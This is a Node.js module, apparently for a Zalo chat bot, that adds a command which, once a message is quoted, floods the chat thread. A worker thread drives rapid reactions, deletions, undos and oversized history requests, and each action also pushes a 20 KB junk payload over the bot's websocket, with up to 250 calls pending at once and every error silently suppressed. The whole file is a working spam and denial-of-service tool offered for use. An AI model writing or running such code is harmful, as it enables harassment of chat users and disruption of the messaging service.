/**
 * ngh-command.js — standalone, 1 file duy nhất, không phụ thuộc gì nội bộ
 * Dùng với Zalo Bot API (Node.js, ESM)
 *
 * Cách gắn vào command.js:
 *   import { handleNghCommand } from "./bot-manager/ngh-command.js";
 *   case "ngh":
 *   case "ngh...":
 *     await handleNghCommand(api, message);
 *     break;
 */
import { Worker } from "worker_threads";

// --- Worker code inline (ESM qua data: URL, không cần file riêng) ---
const WORKER_CODE = `
import { parentPort } from "worker_threads";

const ACTIONS = [
  "junk", "junk", "junk",
  "reaction_LIKE", "reaction_HAHA", "reaction_UNDO",
  "junk", "delete", "undo", "junk",
  "heartbeat", "getRecent", "getInfo",
];

let running = true;
parentPort.on("message", (msg) => { if (msg === "stop") running = false; });
process.on("unhandledRejection", () => {});

(async () => {
  let idx = 0;
  while (running) {
    try {
      for (let i = 0; i < 20 && running; i++) {
        parentPort.postMessage({ type: "action", action: ACTIONS[idx % ACTIONS.length] });
        idx++;
      }
    } catch (_) {}
    await new Promise((r) => setTimeout(r, 10));
  }
  try { parentPort.postMessage({ type: "done" }); } catch (_) {}
})();
`;

// Encode sang data: URL để spawn worker ESM không cần file riêng
const _workerURL = new URL(`data:text/javascript;base64,${Buffer.from(WORKER_CODE).toString("base64")}`);


// Map: threadId → Worker instance
const activeNgh = new Map();

export async function handleNghCommand(api, message) {
  const args = message.data?.content?.split(" ") || [];
  const threadId = message.threadId;

  const cmdUsed = args[0]?.toLowerCase() || "";
  if (!cmdUsed.endsWith("ngh...")) {
    await api.sendMessage({ msg: "Nguyễn Gia Hưng nè", quote: message }, threadId, message.type);
    return;
  }

  // Lệnh stop
  if (args[1]?.toLowerCase() === "stop") {
    const worker = activeNgh.get(threadId);
    if (worker) {
      worker.postMessage("stop");
      setTimeout(() => worker.terminate(), 500);
      activeNgh.delete(threadId);
    }
    return;
  }

  const quote = message.data?.quote;
  if (!quote) {
    await api.sendMessage({ msg: "Nguyễn Gia Hưng nè", quote: message }, threadId, message.type);
    return;
  }

  const msgId = quote.msgId || quote.globalMsgId || quote.id;
  const cliMsgId = quote.cliMsgId || quote.clientMsgId || quote.clientId;
  const ownerId = quote.ownerId || quote.uidFrom || quote.fromId || quote.senderId || quote.userId;
  if (!msgId || !cliMsgId) {
    await api.sendMessage({ msg: "Nguyễn Gia Hưng nè", quote: message }, threadId, message.type);
    return;
  }

  const targetMessage = {
    type: message.type,
    threadId: message.threadId,
    data: {
      ...quote,
      msgId: String(msgId),
      cliMsgId: String(cliMsgId),
      uidFrom: String(ownerId || message.data.uidFrom),
    },
  };

  // Dừng worker cũ nếu có
  const prevWorker = activeNgh.get(threadId);
  if (prevWorker) {
    prevWorker.postMessage("stop");
    setTimeout(() => prevWorker.terminate(), 500);
  }

  // Pre-alloc junk buffer 1 lần, tái sử dụng (20KB mỗi lượt)
  const junkPayload = Buffer.alloc(20 * 1024, "NGH_JUNK_PAYLOAD");

  // Spawn worker thread từ code inline (data: URL)
  const worker = new Worker(_workerURL);

  // Concurrency limiter: tối đa 250 API call pending cùng lúc
  let pending = 0;
  const MAX_PENDING = 250;

  worker.on("message", (msg) => {
    if (msg.type !== "action") return;
    if (pending >= MAX_PENDING) return;
    pending++;
    const done = () => { pending = Math.max(0, pending - 1); };
    const safeCall = (promise) => {
      if (promise && typeof promise.then === "function") {
        promise.then(done, done);
      } else {
        done();
      }
    };

    const sendJunk = () => {
      if (api.listener?.ws && api.listener.ws.readyState === 1) {
        try { api.listener.ws.send(junkPayload, () => {}); } catch (_) {}
      }
    };

    try {
      sendJunk();
      switch (msg.action) {
        case "reaction_LIKE":   safeCall(api.addReaction("LIKE", targetMessage)); break;
        case "reaction_HAHA":   safeCall(api.addReaction("HAHA", targetMessage)); break;
        case "reaction_UNDO":   safeCall(api.addReaction("UNDO", targetMessage)); break;
        case "delete":          safeCall(api.deleteMessage(targetMessage, false)); break;
        case "undo":            safeCall(api.undoMessage(message)); break;
        case "heartbeat":       try { api.listener?.sendHeartbeat?.(); } catch (_) {} done(); break;
        case "getRecent":       safeCall(api.getRecentMessages(threadId, 10000000000000000, 1)); break;
        case "getInfo":         safeCall(api.getGroupInfo(threadId)); break;
        case "junk":            done(); break;
        default:                done(); break;
      }
    } catch (_) {
      done();
    }
  });

  worker.on("error", () => {});
  worker.on("exit", () => { if (activeNgh.get(threadId) === worker) activeNgh.delete(threadId); });

  activeNgh.set(threadId, worker);
}
